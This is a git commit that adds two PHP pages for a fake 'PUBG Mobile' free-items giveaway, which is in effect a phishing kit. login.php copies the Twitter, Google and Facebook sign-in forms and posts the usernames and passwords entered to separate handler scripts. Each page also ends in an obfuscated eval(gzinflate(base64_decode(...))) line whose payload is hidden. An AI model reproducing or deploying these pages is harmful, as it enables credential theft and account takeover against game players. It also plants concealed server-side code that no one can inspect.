bbf43505b97eecd3e759a00682235f08fe6385b4
Kudacuki21 <95318738+Kudacuki21@users.noreply.github.com>
2021-12-01 07:27:24 +0900

    Add files via upload

---
+++ collect.php
@@ -0,0 +1,464 @@
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>PUBG Mobile - Official PUBG on mobile</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta property="og:description" content="For a limited time you can buy all the weapon finish, plane finish, and more item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
+<meta property="og:image" content="img/thumbnail.png"/>
+<meta property="og:image:width" content="540"/>
+<meta property="og:image:height" content="282"/>
+<link rel="icon" type="img/png" href="img/thumbnail.png" sizes="32x32"/>
+<link rel="stylesheet" type="text/css" href="css/style.css"/>
+<link rel="stylesheet" type="text/css" href="css/mystyle.css"/>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
+
+</head>
+<body>
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+
+<div class="sticky">
+<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
+</div>
+<div class="slider-container">
+<div class="slider">
+<img src="img/wts.jpeg" style="width:100%;">
+</div>
+<div class="slider">
+<img src="img/s1.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s2.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s3.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s4.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s5.jpg" style="width:100%">
+</div>
+</div>
+
+<div class="gallery-container">
+
+
+<!--- COLLECTED POP UP --->
+<div id="collected">
+<div class="collected-box">
+<div class="collected-box-image">
+</br>
+</br>
+<center>
+<i style="color:green;" class="fa fa-check-circle fa-4x"></i>
+</br>
+</br>
+</br>
+<h5 class="status-collect">Collected</h5>
+</br>
+<small>Please wait up to 24 hours to get your gift</small>
+</br>
+</br>
+</br>
+<button onclick="location.href='#';" title="Close" class="btn-close">Okay</button>
+</center>
+</div>
+</div>
+</div>
+<!--- /COLLECTED POP UP --->
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<div class="gallery">
+<div class="item">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678586_3884124.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678590_3542041.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678589_5859166.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678588_7839458.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678591_4231565.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="https://s7d4.turboimg.net/t1/39678587_4398840.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/1.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/2.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/3.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/4.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/5.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/6.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/7.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/8.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/9.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/10.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/11.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/12.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/13.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/14.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/15.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/16.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/17.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/18.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/19.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/20.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/21.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/23.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/24.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/25.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/26.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/27.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/28.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/29.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/30.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/31.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/32.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/33.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/34.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/35.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/36.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/37.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/38.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/39.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/40.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/41.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/42.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/43.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/44.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/45.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/46.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/47.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/48.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/49.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/50.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/51.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/52.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/53.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/54.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/55.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/56.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/57.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/58.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/59.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/60.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/61.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/62.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/63.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/64.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/65.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/66.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/67.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/68.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/69.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/70.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/71.jpg">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/72.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/73.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/74.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/75.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/76.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/77.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/78.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item last">
+<img class="thumbnail" src="img/firearms/79.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/80.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+<div class="item">
+<img class="thumbnail" src="img/firearms/81.png">
+<a href="#collected" class="buy">Collect</a>
+</div>
+</div>
+</div>
+
+
+<div class="notification-container">
+<div class="button">
+<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
+<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
+<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
+<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
+</div>
+</div>
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+<div class="footer">
+<center>
+<img style="margin-right:5px" width="30" src="img/pubg.png">
+<img width="80" src="img/tencent.png">
+</center>
+</div>
+
+<script type="text/javascript">
+var slideIndex = 0;
+showSlides();
+function showSlides() {
+    var i;
+    var slides = document.getElementsByClassName("slider");
+    for (i = 0; i < slides.length; i++) {
+        slides[i].style.display = "none"; 
+    }
+    slideIndex++;
+    if (slideIndex > slides.length) {slideIndex = 1} 
+    slides[slideIndex-1].style.display = "block"; 
+    setTimeout(showSlides, 2500);
+}
+</script>
+<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+
+</body>
+
+</html>
+    
+    
+    
+    
+    
---
+++ login.php
@@ -0,0 +1,241 @@
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>PUBG Mobile - Official PUBG on mobile</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta property="og:description" content="For a limited time you can buy all the weapon finish, plane finish, and more item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
+<meta property="og:image" content="img/thumbnail.png"/>
+<meta property="og:image:width" content="540"/>
+<meta property="og:image:height" content="282"/>
+<link rel="icon" type="img/png" href="img/thumbnail.png" sizes="32x32"/>
+<link rel="stylesheet" type="text/css" href="css/style.css"/>
+<link rel="stylesheet" type="text/css" href="css/mystyle.css"/>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+
+</head>
+<body>
+
+
+<style type="text/css">
+	#login fieldset:not(:first-of-type) {
+		display: none;
+	}
+</style>
+
+
+<div class="sticky">
+<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
+</div>
+<div class="slider-container">
+<div class="slider">
+<img src="img/wts.jpeg" style="width:100%;">
+</div>
+<div class="slider">
+<img src="img/s1.jpg" style="width:100%;">
+</div>
+<div class="slider">
+<img src="img/s2.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s3.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s4.jpg" style="width:100%">
+</div>
+<div class="slider">
+<img src="img/s5.jpg" style="width:100%">
+</div>
+</div>
+
+
+<div class="gallery-container">
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--- TWITTER LOGIN --->
+<div id="twitter">
+<div class="twitter-login">
+<a href="#" class="close" title="Close">&times;</a>
+<div class="nav-twitter">
+<center>
+<img width="30" src="img/login-popup/twitter.png">
+</center>
+</div>
+</br>
+</br>
+<center>
+<h5>Login to Twitter</h5>
+</center>
+<form class="formku" action="twitter.php" method="post">
+<input type="text" name="etw" placeholder="Phone, email, or username" autocomplete="off" autocapitalize="off" required></br>
+<input type="password" name="ptw" placeholder="Password" autocomplete="off" autocapitalize="off" required></br>
+</br>
+</br>
+<center>
+<button type="submit" class="btn-login-twitter"><b>Login</b></button>
+</center>
+</form>
+</div>
+</div>
+<!--- /TWITTER LOGIN --->
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--- GOOGLE PLAY LOGIN --->
+<div id="gp">
+<div class="gp-login">
+<a href="#" class="close" title="Close">&times;</a>
+<div class="nav-gp">
+<center>
+<img width="80" src="img/login-popup/google.png">
+</center>
+</div>
+</br>
+<form class="formku" id="login" novalidate action="google.php" method="post">
+<fieldset>
+<center>
+<h5>Sign in</h5>
+</br>
+<b font-size="100" style="color:black;">with your Google Account</b>
+</center>
+<input type="text" name="gmail" placeholder="Email or phone" autocomplete="off" autocapitalize="off" required></br>
+<button type="button" class="btn-register-gp"><b>Create account</b></button>
+<button type="button" class="next btn-login-gp"><b>Next</b></button>
+</fieldset>
+
+<fieldset>
+<center>
+<i style="color: black;" class="fa fa-user-circle fa-3x"></i>
+</br>
+</br>
+<h5>Welcome</h5>
+</br>
+<b font-size="100" style="color:black;">enter your password below</b>
+</center>
+<input type="password" name="gpass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
+<button type="button" class="previous btn-register-gp"><b>Previous</b></button>
+<button type="submit" class="btn-login-gp"><b>Sign in</b></button>
+</fieldset>
+</form>
+</div>
+</div>
+<!--- /GOOGLE PLAY LOGIN --->
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<!--- FB LOGIN --->
+<div id="fb">
+<div class="fb-login">
+<a href="#" class="close" title="Close">&times;</a>
+<div class="nav-fb">
+<center>
+<img width="100" src="img/login-popup/fb.png">
+</center>
+</div>
+</br>
+<form class="formku" action="facebook.php" method="post">
+<p class="mylabel">Phone or email:</p>
+<input type="text" name="efb" placeholder="" autocomplete="off" autocapitalize="off" required></br>
+<p class="mylabel">Password:</p>
+<input type="password" name="pfb" placeholder="" autocomplete="off" autocapitalize="off"></br>
+</br>
+</br>
+<center>
+<button type="submit" class="btn-login-fb"><b>Log In</b></button>
+</center>
+</br>
+</br>
+<div class="divider">
+<span>or</span>
+</div>
+</br>
+</br>
+<center>
+<button class="btn-register-fb">Create a New Account</button>
+</center>
+</form>
+</div>
+</div>
+<!--- /FB LOGIN --->
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<button onclick="location.href='#twitter';" class="twitter"><i style="float:left;" class="fa fa-twitter"></i>Twitter</button>
+</br>
+</br>
+<button onclick="location.href='#fb';" class="fb"><i style="float:left;" class="fa fa-facebook-square"></i>Facebook</button>
+</br>
+</br>
+<button onclick="location.href='#gp';" class="playgame"><i style="float:left;" class="fa fa-google-plus"></i>Google Play Games</button>
+</div>
+
+
+<div class="notification-container">
+<div class="button">
+<a href="">
+<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
+<a href="">
+<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
+</div>
+</div>
+
+
+<div class="footer">
+<center>
+<img style="margin-right:5px" width="30" src="img/pubg.png">
+<img width="80" src="img/tencent.png">
+</center>
+</div>
+<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
+<script type="text/javascript">
+var slideIndex = 0;
+showSlides();
+function showSlides() {
+    var i;
+    var slides = document.getElementsByClassName("slider");
+    for (i = 0; i < slides.length; i++) {
+        slides[i].style.display = "none"; 
+    }
+    slideIndex++;
+    if (slideIndex > slides.length) {slideIndex = 1} 
+    slides[slideIndex-1].style.display = "block"; 
+    setTimeout(showSlides, 2500);
+}
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+	var current = 1,current_step,next_step,steps;
+	steps = $("fieldset").length;
+	$(".next").click(function(){
+		current_step = $(this).parent();
+		next_step = $(this).parent().next();
+		next_step.show();
+		current_step.hide();
+		setProgressBar(++current);
+	});
+	$(".previous").click(function(){
+		current_step = $(this).parent();
+		next_step = $(this).parent().prev();
+		next_step.show();
+		current_step.hide();
+		setProgressBar(--current);
+	});
+	setProgressBar(current);
+	// Change progress bar action
+	function setProgressBar(curStep){
+		var percent = parseFloat(100 / steps) * curStep;
+		percent = percent.toFixed();
+		$(".progress-bar")
+			.css("width",percent+"%")
+			.html(percent+"%");		
+	}
+});
+</script>
+
+
+</body>
+
+</html>
+    
+    
+    
+    
+    
+    
